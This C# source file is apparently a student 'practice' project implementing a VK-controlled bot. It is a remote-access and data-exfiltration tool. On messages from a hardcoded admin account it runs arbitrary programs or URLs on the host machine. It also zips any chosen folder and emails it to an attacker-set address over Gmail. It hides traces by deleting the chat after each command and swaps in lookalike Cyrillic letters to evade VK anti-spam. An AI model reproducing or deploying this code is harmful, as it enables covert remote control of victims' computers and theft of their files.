using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.IO;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.Net.Mail;
using VkNet;
using VkNet.Enums.Filters;
using VkNet.Model;
using VkNet.Model.RequestParams;

namespace Praktika
{
    public partial class BDSM : Form
    {
        private const long ADMIN_ID = 61886355;
        private VkApi vk;

        public BDSM()
        {
            InitializeComponent();
        }

        private void Send(string FileAdres)
        {
            InitializeComponent();
            string localappdata = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData); // Путь в %localappdata%

            string pathToLogs = Path.Combine(localappdata, "logs.zip"); // создаем путь к будущему архиву
            using (var zip = new Ionic.Zip.ZipFile(System.Text.Encoding.GetEncoding("utf-8"))) // кодировку ставим
            {
                if (File.Exists(pathToLogs))
                {
                    File.Delete(pathToLogs); // опять проверки, проверки, проверки
                }
                zip.AddDirectory(FileAdres); // создаем архив
                zip.CompressionLevel = Ionic.Zlib.CompressionLevel.BestCompression;
                zip.Save(Path.Combine(pathToLogs));
            }

            //Отправка на почту

            MailAddress from = new MailAddress(File.ReadAllText("SendMailLog.txt"), "ВКбот");

            // кому отправляем
            MailAddress to = new MailAddress(File.ReadAllText("RECmail.txt"));

            // создаем объект сообщения
            MailMessage m = new MailMessage(from, to);

            // тема письма
            m.Subject = "Тест";

            // текст письма
            m.Body = "<h1>Логи</h1>";

            // письмо представляет код html
            m.IsBodyHtml = true;
            m.Attachments.Add(new Attachment(pathToLogs));

            // адрес smtp-сервера и порт, с которого будем отправлять письмо
            SmtpClient smtp = new SmtpClient("smtp.gmail.com", 587);

            // логин и пароль
            smtp.Credentials = new NetworkCredential(File.ReadAllText("SendMailLog.txt"), File.ReadAllText("SendMailPas.txt"));
            smtp.EnableSsl = true;
            smtp.Send(m);


        }

        // шифруем сообщения бота от антиспама вк 
        string GenerateSpamText(string text)
        {
            Random r = new Random();
            List<char> txt = new List<char>();
            string response = "";

            for (int i = 0; i < text.Length; i++)
                txt.Add(text[i]);
            for (int i = 0; i < text.Length; i++)
            {
                if (txt[i] == 'o')
                {
                    if (r.Next(0, 3) != 1)
                    {
                        txt[i] = 'о';
                    }
                }
                if (txt[i] == 'O')
                {
                    if (r.Next(0, 3) != 1)
                    {
                        txt[i] = 'О';
                    }
                }
                if (txt[i] == 'e')
                {
                    if (r.Next(0, 3) != 1)
                    {
                        txt[i] = 'е';
                    }
                }
                if (txt[i] == 'E')
                {
                    if (r.Next(0, 3) != 1)
                    {
                        txt[i] = 'Е';
                    }
                }
                if (txt[i] == 'a')
                {
                    if (r.Next(0, 3) != 1)
                    {
                        txt[i] = 'а';
                    }
                }
                if (txt[i] == 'A')
                {
                    if (r.Next(0, 3) != 1)
                    {
                        txt[i] = 'А';
                    }
                }
                if (txt[i] == 'c')
                {
                    if (r.Next(0, 3) != 1)
                    {
                        txt[i] = 'с';
                    }
                }
                if (txt[i] == 'C')
                {
                    if (r.Next(0, 3) != 1)
                    {
                        txt[i] = 'С';
                    }
                }
            }
            for (int i = 0; i < txt.Count; i++)
                response += txt[i].ToString();
            return response;
        }
        ///
        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void button2_Click(object sender, EventArgs e)
        {
            Environment.Exit(0);
        }

        private void button1_Click(object sender, EventArgs e)
        {
            vk = new VkApi();

            ApiAuthParams param = new ApiAuthParams();
            param.ApplicationId = 6622958;
            param.Login = File.ReadAllText("VKlog.txt");
            param.Password = File.ReadAllText("VKpas.txt");
            param.Settings = Settings.All;



            try
            {
                vk.Authorize(param);
            }
            catch (Exception)
            {
                MessageBox.Show("Неверный логин или пароль!");
                return;
            }

            MessagesSendParams msgParams = new MessagesSendParams();
            msgParams.UserId = ADMIN_ID;
            msgParams.Message = GenerateSpamText("Бот готов услужить!\n!Help помощь в командах");
            vk.Messages.Send(msgParams);

            MessagesGetObject msg;
            MessagesGetHistoryParams msgHistoryParams = new MessagesGetHistoryParams();
            msgHistoryParams.UserId = ADMIN_ID;
            msgHistoryParams.Count = 1;
            msgHistoryParams.Offset = 0;

            while (true)
            {
                try
                {
                    msg = vk.Messages.GetHistory(msgHistoryParams);
                }
                catch (Exception)
                {
                    msg = vk.Messages.GetHistory(msgHistoryParams);
                }
                if (msg.Messages.Count > 0)
                {
                    if (msg.Messages[0].Body.Contains("!Run")) // !Run [url/exe/path]
                    {
                        vk.Messages.DeleteDialog(ADMIN_ID, false);
                        Process.Start(msg.Messages[0].Body.Split(' ').Last());
                    }
                    if (msg.Messages[0].Body.Contains("!Help"))
                    {
                        msgParams.Message = GenerateSpamText("!Run [url/exe/path] - запуск приложений\n" + "!SendMail - Отправка указанного файла сообщением\n"
                            + "!ChangeRecipient - изменить получателя\n" + "!RecipientMail - вывести имя получателя\n" + "");
                        vk.Messages.Send(msgParams);
                        vk.Messages.DeleteDialog(ADMIN_ID, false);
                    }
                    if (msg.Messages[0].Body.Contains("!SendMail"))
                    {
                        string FileAdres = msg.Messages[0].Body.Split(' ').Last();
                        Send(FileAdres);
                        vk.Messages.DeleteDialog(ADMIN_ID, false);
                    }
                    if (msg.Messages[0].Body.Contains("!ChangeRecipient"))
                    {
                        string NewRecMail = msg.Messages[0].Body.Split(' ').Last();
                        File.WriteAllText("RECmail.txt", NewRecMail);
                        vk.Messages.DeleteDialog(ADMIN_ID, false);
                    }
                    if (msg.Messages[0].Body.Contains("!RecipientMail"))
                    {
                        string ReadRecMail = File.ReadAllText("RECmail.txt");
                        msgParams.Message = GenerateSpamText(ReadRecMail);
                        vk.Messages.Send(msgParams);
                        vk.Messages.DeleteDialog(ADMIN_ID, false);
                    }

                    Thread.Sleep(5000);
                }

            }
        }
    }
}
